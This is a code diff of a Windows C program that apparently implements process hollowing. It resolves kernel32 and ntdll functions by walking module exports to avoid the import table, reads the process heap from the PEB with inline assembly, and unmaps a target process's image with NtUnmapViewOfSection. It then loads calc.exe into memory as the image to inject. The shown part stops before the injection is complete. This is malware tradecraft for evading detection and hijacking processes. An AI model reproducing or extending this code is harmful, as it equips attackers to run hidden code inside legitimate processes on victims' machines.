@@ -57,14 +57,22 @@ typedef  BOOL(__stdcall* _ReadProcessMemory)(HANDLE ,LPCVOID , LPVOID ,SIZE_T ,S
 typedef  BOOL(__stdcall* _WriteProcessMemory)(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T);
 typedef  HANDLE(__stdcall* _CreateFileA)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
 typedef  DWORD(__stdcall* _GetFileSize)(HANDLE, LPDWORD);
-typedef  LPVOID(__stdcall* _HeapAlloc)(HANDLE , DWORD, SIZE_T);
+typedef  PVOID(WINAPI* _RtlAllocateHeap)(HANDLE , DWORD, SIZE_T);
 typedef BOOL(__stdcall* _ReadFile)(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED); 
 typedef  NTSTATUS(WINAPI* _NtQueryInformationProcess)(HANDLE , PROCESS_INFORMATION_CLASS,PVOID,ULONG,PULONG);
 typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(HANDLE, PVOID);
-
+typedef HANDLE(* _GetProcessHeap)();
 
 DWORD kernel32_base, ntdll_base; 
 
+DWORD GetProcessHeapo()
+{
+	__asm {
+		xor eax , eax
+		mov eax , fs:[eax+0x30]
+		mov eax , [eax+0x18]
+	}
+}
 
 void Kernel32_NTdll_bases()
 {
@@ -177,4 +185,29 @@ int wmain()
 #endif
 	NtUnmapViewOfSe(target,TargetImageBase);
 
+	
+	
+	/*source file*/
+	_CreateFileA Createfil = find_function_address(kernel32_base,"CreateFileA");
+	HANDLE src = Createfil("C:\\Windows\\syswow64\\calc.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
+	
+	_GetFileSize GetFilesiz = find_function_address(kernel32_base, "GetFileSize");
+	DWORD srcSize = GetFilesiz(src, NULL);
+	LPDWORD BytesRead = 0;
+	_RtlAllocateHeap RtlAllocateH = find_function_address(ntdll_base , "RtlAllocateHeap");
+#ifdef DEBUG
+	printf("[+] RtlAllocateHeap address @ %x\n", (DWORD)RtlAllocateH);
+#endif
+	_GetProcessHeap GetProcessHea = find_function_address(kernel32_base, "GetProcessHeap");
+#ifdef DEBUG
+	printf("[+] GetProcessHea address @ %x\n", (DWORD)GetProcessHea);  
+#endif
+	HANDLE heappi= GetProcessHeapo(); 
+#ifdef DEBUG
+	printf("\n[+]address of Heapalloc = %x , another fucking address = %x", GetProcAddress(GetModuleHandleA("kernel32.dll"),"HeapAlloc"), RtlAllocateH);
+#endif
+	LPVOID srcBuffer = RtlAllocateH(heappi, HEAP_ZERO_MEMORY, srcSize);
+	_ReadFile ReadFil = find_function_address(kernel32_base, "ReadFile");
+	ReadFil(src, srcBuffer, srcSize, NULL, NULL);
+	return 0; 
 }
